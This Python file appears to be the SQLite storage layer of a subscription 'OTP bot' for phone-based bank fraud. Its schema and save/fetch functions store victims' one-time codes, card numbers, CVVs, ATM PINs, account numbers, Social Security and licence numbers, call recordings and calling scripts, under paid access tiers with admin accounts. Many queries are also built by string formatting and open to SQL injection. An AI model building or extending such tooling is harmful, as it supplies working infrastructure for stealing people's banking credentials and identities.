import sqlite3
from datetime import *
path = 'UserDetails.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

c.execute("""CREATE TABLE IF NOT EXISTS UserData (
        id int AUTO_INCREMENT,
        user_id int,
        bank_name text,
        phone_no text,
        otp_code int,
        Recording_url text,
        card_number int,
        card_cvv int,
        card_expiry int,
        account_number int,
        atm_pin int,
        expiry_date int,
        option1 text,
        option2 text,
        option3 text,
        option4 text,
        option_number text,
        numbers_collected1 text,
        numbers_collected2 text,
        voice text,
        dl_number text,
        ssn_number text,
        app_number text,
        script text

    )""")

c.execute("""CREATE TABLE IF NOT EXISTS Admindata (
        id int AUTO_INCREMENT,
        admin_id int
   )""")

c.execute("""CREATE TABLE IF NOT EXISTS Smsmode (
        id int AUTO_INCREMENT,
        user_id int
           )""")


# Database functions


def create_admin(adminid):
    sql = f"Insert into AdminData (admin_id) values({adminid})"
    c.execute(sql)
    conn.commit()

def create_user_test(userid):
    today = date.today()
    exp_day_test = today + timedelta(days=2)
    sql = f"Insert into UserData (user_id,bank_name,phone_no,otp_code,Recording_url,card_number,card_cvv,card_expiry,account_number,atm_pin, expiry_date, option1, option2, option3, option4, option_number, numbers_collected1, numbers_collected2,voice,dl_number, ssn_number, app_number, script)values('{userid}','Notavailable','Notavailable',0,'Notavailable',0,0,0,0,0,'{exp_day_test}','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable')"
    c.execute(sql)
    conn.commit()

def create_user_7days(userid):
    today = date.today()
    exp_day_7days = today + timedelta(days = 7)
    sql = f"Insert into UserData (user_id,bank_name,phone_no,otp_code,Recording_url,card_number,card_cvv,card_expiry,account_number,atm_pin, expiry_date, option1, option2, option3, option4, option_number, numbers_collected1, numbers_collected2,voice,dl_number, ssn_number, app_number, script)values('{userid}','Notavailable','Notavailable',0,'Notavailable',0,0,0,0,0,'{exp_day_7days}','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable')"
    c.execute(sql)
    conn.commit()

def create_user_1month(userid):
    today = date.today()
    exp_day_1month = today + timedelta(days = 30)
    sql = f"Insert into UserData (user_id,bank_name,phone_no,otp_code,Recording_url,card_number,card_cvv,card_expiry,account_number,atm_pin, expiry_date, option1, option2, option3, option4, option_number, numbers_collected1, numbers_collected2,voice,dl_number, ssn_number, app_number, script)values('{userid}','Notavailable','Notavailable',0,'Notavailable',0,0,0,0,0,'{exp_day_1month}','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable')"
    c.execute(sql)
    conn.commit()

def create_user_3months(userid):
    today = date.today()
    exp_day_3months = today + timedelta(days = 84)
    sql = f"Insert into UserData (user_id,bank_name,phone_no,otp_code,Recording_url,card_number,card_cvv,card_expiry,account_number,atm_pin, expiry_date, option1, option2, option3, option4, option_number, numbers_collected1, numbers_collected2,voice,dl_number, ssn_number, app_number, script)values('{userid}','Notavailable','Notavailable',0,'Notavailable',0,0,0,0,0,'{exp_day_3months}','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable')"
    c.execute(sql)
    conn.commit()

def create_user_lifetime(userid):
    today = date.today()
    exp_day_lifetime = today + timedelta(days = 365)
    sql = f"Insert into UserData (user_id,bank_name,phone_no,otp_code,Recording_url,card_number,card_cvv,card_expiry,account_number,atm_pin, expiry_date, option1, option2, option3, option4, option_number, numbers_collected1, numbers_collected2,voice,dl_number, ssn_number, app_number, script)values('{userid}','Notavailable','Notavailable',0,'Notavailable',0,0,0,0,0,'{exp_day_lifetime}','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable','Notavailable')"
    c.execute(sql)
    conn.commit()

def save_phonenumber(phone_no,userid):
    c.execute("UPDATE UserData SET phone_no = ? WHERE user_id = ?",(phone_no, userid))
    # c.execute("INSERT INTO UserData VALUES (?)", (phone_no,))
    conn.commit()

def save_bankName(sbank_N, userid):
    c.execute("UPDATE UserData SET bank_name = ? WHERE user_id = ?",(sbank_N, userid))
    conn.commit()

def save_otpcode(otp_code, userid):
    c.execute("UPDATE UserData SET otp_code = ? WHERE user_id = ?",(otp_code, userid))
    conn.commit()

def save_recordingurl(recording_url, userid):
    c.execute("UPDATE UserData SET Recording_url = ? WHERE user_id = ?", (recording_url, userid))
    conn.commit()

def save_cardnumber(card_number, userid):
    c.execute("UPDATE UserData SET card_number = ? WHERE user_id = ?", (card_number, userid))
    conn.commit()

def save_cardexpiry(card_expiry, userid):
    c.execute("UPDATE UserData SET card_expiry = ? WHERE user_id = ?", (card_expiry, userid))
    conn.commit()

def save_cardcvv(card_cvv,userid):
    c.execute("UPDATE UserData SET card_cvv = ? WHERE user_id = ?",(card_cvv, userid))
    conn.commit()

def save_accountnumber(account_number, userid):
    c.execute("UPDATE UserData SET account_number = ? WHERE user_id = ?",(account_number, userid))
    conn.commit()

def save_atmpin(atm_pin, userid):
    c.execute("UPDATE UserData SET atm_pin = ? WHERE user_id = ?", (atm_pin, userid))
    conn.commit()

def save_option1(option1, userid):
    c.execute("UPDATE UserData SET option1 = ? WHERE user_id = ?", (option1, userid))
    conn.commit()

def save_option2(option2, userid):
    c.execute("UPDATE UserData SET option2 = ? WHERE user_id = ?", (option2, userid))
    conn.commit()

def save_option3(option3,userid):
    c.execute("UPDATE UserData SET option3 = ? WHERE user_id = ?",(option3, userid))
    conn.commit()

def save_option4(option4, userid):
    c.execute("UPDATE UserData SET option4 = ? WHERE user_id = ?",(option4, userid))
    conn.commit()

def save_script(script, userid):
    c.execute("UPDATE UserData SET script = ? WHERE user_id = ?", (script, userid))
    conn.commit()

def save_option_number(option_number, userid):
    c.execute("UPDATE UserData SET option_number = ? WHERE user_id = ?", (option_number, userid))
    conn.commit()

def save_numbercollected1(numbers_collected1, userid):
    c.execute("UPDATE UserData SET numbers_collected1 = ? WHERE user_id = ?", (numbers_collected1, userid))
    conn.commit()

def save_numbercollected2(numbers_collected2, userid):
    c.execute("UPDATE UserData SET numbers_collected2 = ? WHERE user_id = ?", (numbers_collected2, userid))
    conn.commit()

def save_voice(voice, userid):
    c.execute("UPDATE UserData SET voice = ? WHERE user_id = ?", (voice, userid))
    conn.commit()

def save_dlnumber(dlnumber, userid):
    c.execute("UPDATE UserData SET dl_number = ? WHERE user_id = ?", (dlnumber, userid))
    conn.commit()

def save_ssnumber(ssnumber, userid):
    c.execute("UPDATE UserData SET ssn_number = ? WHERE user_id = ?", (ssnumber, userid))
    conn.commit()

def save_applnumber(applnumber, userid):
    c.execute("UPDATE UserData SET app_number = ? WHERE user_id = ?", (applnumber, userid))
    conn.commit()

def fetch_bankname(userid):
     c.execute(f"SELECT bank_name FROM UserData WHERE user_id = '{userid}'")
     bankname = str(c.fetchone()[0])
     conn.commit()
     return bankname

def fetch_phonenumber(userid):
    c.execute(f"SELECT phone_no FROM UserData WHERE user_id ='{userid}'")
    phonenumber = str(c.fetchone()[0])
    conn.commit()
    return phonenumber

def fetch_otpcode(userid):
    c.execute(f"SELECT otp_code FROM UserData WHERE user_id = '{userid}'")
    otpcode = str(c.fetchone()[0])
    conn.commit()
    return otpcode

def fetch_recordingurl(userid):
    c.execute(f"SELECT Recording_url FROM UserData WHERE user_id = '{userid}'")
    recordingurl = str(c.fetchone()[0])
    conn.commit()
    return recordingurl

def fetch_cardnumber(userid):
    c.execute(f"SELECT card_number FROM UserData WHERE user_id = '{userid}'")
    try:
        cardnumber = str(c.fetchone()[0])
        conn.commit()
    except TypeError:
        return '?'
    else:
        return cardnumber

def fetch_cardcvv(userid):
    c.execute(f"SELECT card_cvv FROM UserData WHERE user_id ='{userid}'")
    cardcvv = str(c.fetchone()[0])
    conn.commit()
    return cardcvv

def fetch_cardexpiry(userid):
    c.execute(f"SELECT card_expiry FROM UserData WHERE user_id ='{userid}'")
    cardexpiry = str(c.fetchone()[0])
    conn.commit()
    return cardexpiry

def fetch_accountnumber(userid):
    c.execute(f"SELECT account_number FROM UserData WHERE user_id = '{userid}'")
    accountnumber = str(c.fetchone()[0])
    conn.commit()
    return accountnumber

def fetch_atmpin(userid):
    c.execute(f"SELECT atm_pin FROM UserData WHERE user_id = '{userid}'")
    atmpin = str(c.fetchone()[0])
    conn.commit()
    return atmpin

def fetch_expiry_date(userid):
    try:
        c.execute(f"SELECT expiry_date FROM UserData WHERE user_id = '{userid}'")
        expiry = str(c.fetchone()[0])
        expirydate = datetime.strptime(expiry, '%Y-%m-%d').date()
        conn.commit()
        return expirydate
    except:
        return ''

def fetch_option1(userid):
    c.execute(f"SELECT option1 FROM UserData WHERE user_id = '{userid}'")
    try:
        option1 = str(c.fetchone()[0])
        conn.commit()
    except:
        return ''
    else:
        return option1

def fetch_option2(userid):
    c.execute(f"SELECT option2 FROM UserData WHERE user_id ='{userid}'")
    try:
        option2 = str(c.fetchone()[0])
        conn.commit()
    except:
        return ''
    else:
        return option2
def fetch_script(userid):
    try:
        c.execute(f"SELECT script FROM UserData WHERE user_id = '{userid}'")
        script = str(c.fetchone()[0])
        conn.commit()
        return script
    except:
        return ''
def fetch_option_number(userid):
        c.execute(f"SELECT option_number FROM UserData WHERE user_id = '{userid}'")
        option_number = str(c.fetchone()[0])
        conn.commit()
        return option_number

def fetch_numbercollected1(userid):
    try:
        c.execute(f"SELECT numbers_collected1 FROM UserData WHERE user_id = '{userid}'")
        number_collected1 = str(c.fetchone()[0])
        conn.commit()
        return number_collected1
    except:
        return ''

def fetch_numbercollected2(userid):
    try:
        c.execute(f"SELECT numbers_collected2 FROM UserData WHERE user_id = '{userid}'")
        number_collected2 = str(c.fetchone()[0])
        conn.commit()
        return number_collected2
    except:
        return ''

def fetch_voice(userid):
    try:
        c.execute(f"SELECT voice FROM UserData WHERE user_id = '{userid}'")
        voice = str(c.fetchone()[0])
        conn.commit()
        return voice
    except:
        return ''

def fetch_dlnumber(userid):
    c.execute(f"SELECT dl_number FROM UserData WHERE user_id ='{userid}'")
    dlnumber = str(c.fetchone()[0])
    conn.commit()
    return dlnumber

def fetch_ssnumber(userid):
    c.execute(f"SELECT ssn_number FROM UserData WHERE user_id ='{userid}'")
    ssnumber = str(c.fetchone()[0])
    conn.commit()
    return ssnumber

def fetch_applenumber(userid):
    c.execute(f"SELECT app_number FROM UserData WHERE user_id ='{userid}'")
    appl_number = str(c.fetchone()[0])
    conn.commit()
    return appl_number

def userid_fetcher():
    c.execute("SELECT user_id FROM UserData")
    listuserid = c.fetchall()
    conn.commit()
    return listuserid

def userid_fetcher_sms():
    c.execute("SELECT user_id FROM Smsmode")
    listuserid = c.fetchall()
    conn.commit()
    return listuserid


def create_admin(admin_id):
    sql = (f"Insert into Admindata (admin_id) values({admin_id})")
    c.execute(sql)
    conn.commit()

def adminid_fetcher():
    c.execute("SELECT admin_id FROM Admindata")
    listadminid = c.fetchall()
    conn.commit()
    return listadminid

def fetch_UserData_table():
    c.execute("SELECT * FROM UserData")
    table = c.fetchall()
    conn.commit()
    return table

def fetch_Admindata_table():
    c.execute("SELECT * FROM AdminData")
    table = c.fetchall()
    conn.commit()
    return table


def delete_alldata_UserData():
    c.execute("DELETE FROM UserData")
    conn.commit()

def delete_alldata_AdminData():
    c.execute("DELETE FROM Admindata")
    conn.commit()

def delete_specific_UserData(userid):
    c.execute("DELETE FROM UserData WHERE user_id = ?", (userid,))
    conn.commit()

def delete_specific_AdminData(admin_id):
    c.execute("DELETE FROM Admindata WHERE admin_id = ?", (admin_id,))
    conn.commit()

def check_admin(id):
    admin_list = adminid_fetcher()
    for x in admin_list:
        if id in x:
            return True
        else:
            continue
    else:
        return False

def check_user(id):
    user_list = userid_fetcher()
    for x in user_list:
        if id in x:
            return True
        else:
            continue
    else:
        return False

def check_expiry_days(id):
    exp = fetch_expiry_date(id)
    today = date.today()
    days_left = (exp - today).days
    return days_left

def fetch_sms_userid(phone_no):
    c.execute(f"SELECT user_id FROM Userdata WHERE phone_no ='{phone_no}'")
    userid = str(c.fetchone()[0])
    conn.commit()
    return userid

